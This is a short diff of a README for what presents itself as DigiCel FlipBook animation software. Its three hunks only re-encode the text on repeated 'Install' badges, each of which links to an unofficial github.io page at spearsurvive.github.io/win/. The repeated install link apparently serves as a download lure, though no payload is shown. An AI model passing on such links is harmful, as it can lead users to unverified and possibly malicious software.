@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install DigiCel FlipBook](https://img.shields.io/badge/⬇_Install_DigiCel%20FlipBook-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install DigiCel FlipBook](https://img.shields.io/badge/⬇_Install_DigiCel+FlipBook-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ DigiCel FlipBook is a traditional animation software designed for creating hand-
 
 <div align="center">
 
-[![⬇ Install DigiCel FlipBook](https://img.shields.io/badge/⬇_Install_DigiCel%20FlipBook-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install DigiCel FlipBook](https://img.shields.io/badge/⬇_Install_DigiCel+FlipBook-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ DigiCel FlipBook is a traditional animation software designed for creating hand-
 
 <div align="center">
 
-[![⬇ Install DigiCel FlipBook](https://img.shields.io/badge/⬇_Install_DigiCel%20FlipBook-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install DigiCel FlipBook](https://img.shields.io/badge/⬇_Install_DigiCel+FlipBook-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
